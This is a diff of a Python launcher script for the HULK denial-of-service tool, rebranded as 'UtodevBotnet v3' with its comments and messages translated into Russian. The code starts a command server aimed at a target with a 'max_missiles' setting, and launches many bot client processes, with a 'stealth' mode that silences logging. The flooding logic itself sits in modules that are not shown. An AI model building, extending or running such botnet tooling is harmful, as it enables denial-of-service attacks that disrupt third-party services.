@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
 """
-Hulk v3
+UtodevBotnet v3
 
-Script to launch multiple instances of Hulk.
+Скрипт для запуска нескольких экземпляров UtodevBotnet.
 """
 
 import argparse
@@ -17,19 +17,19 @@ from typing import Tuple
 from utils import bordered
 
 
-LOGGER = logging.getLogger("Hulk_Launcher")
+LOGGER = logging.getLogger("UtodevBotnet_Launcher")
 LOGGER.setLevel(logging.INFO)
 LOGGER.addHandler(logging.StreamHandler(sys.stdout))
 
 
 def get_live_message(title: str, args: argparse.Namespace):
-    """Get a visually appealing status message.
+    """Получить визуально привлекательное статусное сообщение.
 
-    :param title: The title.
+    :param title: Заголовок.
     :type title: str
-    :param args: The arguments.
+    :param args: Аргументы.
     :type args: argparse.Namespace
-    :return: The live message.
+    :return: Сообщение статуса.
     :rtype: str
     """
     # pylint: disable=import-outside-toplevel
@@ -46,30 +46,30 @@ def get_live_message(title: str, args: argparse.Namespace):
 
 def launch_server(args: argparse.Namespace):
     """
-    Launch the Hulk server.
-    :param args: The arguments.
+    Запустить сервер UtodevBotnet.
+    :param args: Аргументы.
     :type args: argparse.Namespace
     """
     # pylint: disable=import-outside-toplevel, duplicate-code
-    from server.hulk_server import HulkServer
+    from server.server import UtodevBotnetServer
 
     msg_args = copy(args)
     msg_args.__dict__.pop('target')
-    LOGGER.info(get_live_message("Hulk Server is Live!", msg_args))
+    LOGGER.info(get_live_message("Сервер UtodevBotnet запущен!", msg_args))
     if args.gui:
         if platform.system() == 'Windows':
             from server.logger import WinNamedPipeHandler, UnixNamedPipeHandler
 
-            logging.getLogger('Hulk_Server').addHandler(
+            logging.getLogger('UtodevBotnet_Server').addHandler(
                 WinNamedPipeHandler(wait_for_pipe=True)
             )
         else:
             from server.logger import UnixNamedPipeHandler
 
-            logging.getLogger('Hulk_Server').addHandler(
+            logging.getLogger('UtodevBotnet_Server').addHandler(
                 UnixNamedPipeHandler(wait_for_pipe=True)
             )
-    server = HulkServer(
+    server = UtodevBotnetServer(
         args.target, args.port,
         args.persistent,
         args.max_missiles
@@ -79,28 +79,28 @@ def launch_server(args: argparse.Namespace):
 
 def launch_client(args: argparse.Namespace):
     """
-    Launches the Hulk client.
-    :param args: The arguments.
+    Запускает клиент UtodevBotnet.
+    :param args: Аргументы.
     :type args: argparse.Namespace
     """
     # pylint: disable=import-outside-toplevel
     import asyncio
     from threading import Thread
 
-    from client.hulk import Comms
+    from client.bot import Comms
 
     if platform.system() == 'Windows':
         asyncio.set_event_loop_policy(
             asyncio.WindowsSelectorEventLoopPolicy()
         )
 
-    # Parse the arguments.
+    # Парсинг аргументов.
     root_ip = args.root_ip
     root_port = args.root_port
     num_processes = args.num_processes
     if args.stealth:
-        logging.getLogger('Hulk_Client').setLevel(logging.ERROR)
-    LOGGER.info(get_live_message("Launching Hulk v3", args))
+        logging.getLogger('UtodevBotnet_Client').setLevel(logging.ERROR)
+    LOGGER.info(get_live_message("Запуск UtodevBotnet v3", args))
 
     threads = [
         Thread(
@@ -120,39 +120,39 @@ def create_parser() -> Tuple[
     argparse._SubParsersAction
 ]:
     """
-    Creates the Multicommand Argument Parser.
-    :return: The Multicommand Argument Parser and Subparsers.
+    Создает парсер аргументов с несколькими командами.
+    :return: Парсер аргументов с несколькими командами и подпарсеры.
     :rtype: Tuple[argparse.ArgumentParser, argparse.ArgumentParser]
     """
 
     class CustomParser(argparse.ArgumentParser):
         """
-        Custom parser to format error string.
+        Пользовательский парсер для форматирования строки ошибки.
         """
         def error(self, message):
             if "{Client / Server}" in message:
                 LOGGER.info(
-                    "Either 'client' or 'server' must be specified "
-                    "as the first argument."
+                    "Необходимо указать 'client' или 'server' "
+                    "в качестве первого аргумента."
                 )
                 sys.exit(1)
             super().error(message)
 
     class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter):
         """
-        Custom formatter for the help text.
+        Пользовательский форматтер для текста справки.
         """
         def _get_help_string(self, action):
             help_text = super()._get_help_string(action)
             if action.dest == 'num_processes':
                 return help_text.replace(
                     '(default: %(default)s)',
-                    '(default: No. of Cores. [%(default)s])'
+                    '(по умолчанию: Количество ядер. [%(default)s])'
                 )
             return help_text
 
     parser = CustomParser(
-        description="Hulk Launcher",
+        description="Запуск UtodevBotnet",
         formatter_class=CustomFormatter
     )
     subparsers = parser.add_subparsers(
@@ -165,23 +165,23 @@ def create_parser() -> Tuple[
 
 def add_client_parser(subparsers: argparse._SubParsersAction):
     """
-    Adds the Client Parser.
-    :param subparsers: The Subparsers.
+    Добавляет парсер клиента.
+    :param subparsers: Подпарсеры.
     :type subparsers: argparse._SubParsersAction
     """
     # pylint: disable=import-outside-toplevel
-    from client.hulk import modify_parser
+    from client.bot import modify_parser
 
     client_parser = subparsers.add_parser(
         "client",
-        description="The Hulk Bot Launcher",
-        help="Launches multiple Hulk Clients.\n"
-        "(Check out [hulk_launcher.py client -h])"
+        description="Запуск ботов UtodevBotnet",
+        help="Запускает несколько клиентов UtodevBotnet.\n"
+        "(Смотрите [launcher.py client -h])"
     )
     modify_parser(client_parser)
     client_parser.add_argument(
         '-n', '--num_processes',
-        help='Number of processes to launch.',
+        help='Количество процессов для запуска.',
         default=os.cpu_count(),
         type=int,
     )
@@ -189,18 +189,18 @@ def add_client_parser(subparsers: argparse._SubParsersAction):
 
 def add_server_parser(subparsers: argparse._SubParsersAction):
     """
-    Adds the Server Parser.
-    :param subparsers: The Subparsers.
+    Добавляет парсер сервера.
+    :param subparsers: Подпарсеры.
     :type subparsers: argparse._SubParsersAction
     """
     # pylint: disable=import-outside-toplevel
-    from server.hulk_server import modify_parser
+    from server.server import modify_parser
 
     server_parser = subparsers.add_parser(
         "server",
-        description="The Hulk Server Launcher",
-        help="Launches the Hulk Server.\n"
-        "(Check out [hulk_launcher.py server -h])"
+        description="Запуск сервера UtodevBotnet",
+        help="Запускает сервер UtodevBotnet.\n"
+        "(Смотрите [launcher.py server -h])"
     )
     modify_parser(server_parser)
 
